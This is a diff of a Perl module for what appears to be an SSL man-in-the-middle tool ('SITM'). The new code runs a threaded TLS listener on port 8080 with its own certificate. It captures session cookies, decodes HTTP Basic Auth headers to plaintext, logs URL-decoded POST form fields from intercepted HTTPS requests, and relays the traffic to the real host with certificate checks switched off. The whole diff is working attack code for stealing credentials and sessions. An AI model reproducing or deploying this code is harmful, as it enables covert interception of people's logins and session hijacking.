@@ -1,106 +1,122 @@
-my $ioset = IO::Select->new;
-my %socket_map;
-
-
-sub new_conn {
-    my ($host) = @_;
-    if (!$host) {
-        return 0;
-    }
-    my $sock = IO::Socket::SSL->new(
-        PeerHost => $host,
-        PeerPort => "https",
-        SSL_verify_mode => SSL_VERIFY_NONE,
-    ) or die "failed connect or ssl handshake: $!,$SSL_ERROR";
-
-}
-
-sub new_server {
-    my ($host, $port) = @_;
-    my $server = IO::Socket::SSL->new(
+sub Start_HTTP_SSL_Server_Thread {
+    # creating a listening socket
+    my $socket = IO::Socket::SSL->new(
         LocalAddr => '0.0.0.0',
         LocalPort => 8080,
         ReuseAddr => 1,
         Listen    => 100,
         SSL_cert_file => 'Certs/certificate.pem',
         SSL_key_file => 'Certs/key.pem',
-    ) or die "failed to listen: $!";
-}
+    );
+    AddLogInfo("cannot create socket $!\n") unless $socket;
 
-sub new_connection {
-    my $server = shift;
-    my $client = $server->accept;
-    my $client_ip = client_ip($client);
-    my $peer = $client->get_servername;
+    AddLogInfo("SITM SSL Server Running on port : 8080\n");
+    my $client_socket;
 
-    AddLogInfo("Connection from $client_ip : $peer accepted.\n") if $debug;
-
-    my $remote = new_conn($peer);
-    $ioset->add($client);
-    $ioset->add($remote);
-
-    $socket_map{$client} = $remote;
-    $socket_map{$remote} = $client;
-}
-
-sub close_connection {
-    my $client = shift;
-    my $client_ip = client_ip($client);
-    my $remote = $socket_map{$client};
-    
-    $ioset->remove($client);
-    $ioset->remove($remote);
-
-    delete $socket_map{$client};
-    delete $socket_map{$remote};
-
-    $client->close;
-    $remote->close;
-
-    AddLogInfo("Connection from $client_ip closed.\n") if $debug;
-}
-
-sub client_ip {
-    my $client = shift;
-    if ($client && $client->sockaddr)
+    while($client_socket = $socket->accept())
     {
-        return inet_ntoa($client->sockaddr);
+        my $t = threads->create({'context' => 'void'},\&Process_HTTPS,$client_socket);
     }
-    return "Unknown"
+     
+    $socket->close();
 }
 
-sub Start_HTTP_SSL_Server_Thread {
-	AddLogInfo("Starting SITM HTTPS Server on 0.0.0.0:8080\n");
-	open(FDD,">>log");
-	my $server = new_server();
-	$ioset->add($server);
+sub Process_HTTPS{
+    # get information about a newly connected client
+    my $client_socket = $_[0];
+    my $host = "";
+    my $client_address = $client_socket->peerhost();
 
-	while (1) {
-	    for my $socket ($ioset->can_read) {
-	        if ($socket == $server) {
-	            new_connection($server);
-	        }
-	        else {
-	            next unless exists $socket_map{$socket};
-	            my $remote = $socket_map{$socket};
-	            my $buffer;
-	            my $read = $socket->sysread($buffer, 4096);
-	            if ($read) {
+    # read up to 1024 characters from the connected client
+    my $data = "";
+    my $posting = 0;
+    my $log = 0;
+    my $httpown_page;
+    $client_socket->sysread($data, 1024);
+    foreach my $sslline (split("\n",$data))
+    {
+        if ($sslline =~ /POST \//)
+        {
+            $posting = 1;
+        }
+        if ($sslline =~ m/(GET|POST)/)
+        {
+            my @page = split(" ",$sslline);
+            if (GoodPage($page[1]))
+            {
+                $log = 1;
+                $httpown_page=$page[1];
+            }
+            
+        }
+        elsif ($sslline =~ /Host: /)
+        {
+            my $tmp = $sslline;
+            $tmp =~ s/Host: //;
+            $tmp =~ s/\n//;
+            $tmp =~ s/\r//;
+            $host = $tmp;
+        }
+        elsif ($sslline =~ /Cookie: / && $host && $httpown_page)
+        {
+            my $httpown_cookie = substr $sslline, 8; 
+            $httpown_cookie = CookieEncode($httpown_cookie);
+            $Captured_Pages{"http://".$host.$httpown_page} = $httpown_cookie;
+            AddLogInfo("[".$client_socket->peerhost()."][HTTPS][SESSION Cookie] http://".$host.$httpown_page."\n");
+        }
+        elsif ($sslline =~ m/Authorization: Basic/ && $host)
+        {
+            my $authcode = substr $sslline, 21; 
+            my $base64decoded = decode_base64($authcode);
+            AddLogInfo("[".$client_socket->peerhost()."][HTTPS][$host]Auth : $base64decoded\n");
 
-                	foreach my $data (split(/\n/, $buffer))
-                	{
-                		AddLogInfo($data."\r\n");
-                	}
-	                print FDD $buffer;
-	                $remote->syswrite($buffer);
-	            }
-	            else {
-	                close_connection($socket);
-	            }
-	        }
-	    }
-	}
-	close FDD;
+        }
+        elsif ($posting == 1 && $sslline eq "\r")
+        {
+            $posting++;
+        }
+        elsif ($posting == 2)
+        {
+            AddLogInfo("POST DATA : $sslline\n");
+            my @tmp = split(/&/, $sslline);         
+            foreach my $data (@tmp){
+                if ($data =~ /=/)
+                {
+                    $data = uri_unescape($data);
+                    $data =~ s/\+/ /g;
+                    AddLogInfo("[".$client_socket->peerhost()."][POST] $host : $data\n");
+                    #AddPassword("[".$client->peerhost()."][$host][HTTP/POST] Parameter : ".$data."");
+                }
+            }
+        }
+    }
+   
+
+    if ($host)
+    {
+        Handle_Client($client_socket,$host,$data);
+    }
+    shutdown($client_socket, 1);
+    return 1;
+}
+
+sub Handle_Client {
+    my ($client,$host,$data) = @_;
+    AddLogInfo("Connection from : " . $client->peerhost(). " to : " .$host."\n");
+    my $proxy = IO::Socket::SSL->new(
+        PeerHost => $host,
+        PeerPort => "https",
+
+        SSL_verify_mode => SSL_VERIFY_NONE,
+
+    ) or return 0;
+    $proxy->syswrite($data);
+    #AddLogInfo $tmp_data;
+    while (my $cdata = <$proxy>)
+    {
+        $client->syswrite($cdata);
+    }
+    $proxy->close();
 }
 
 return 1;
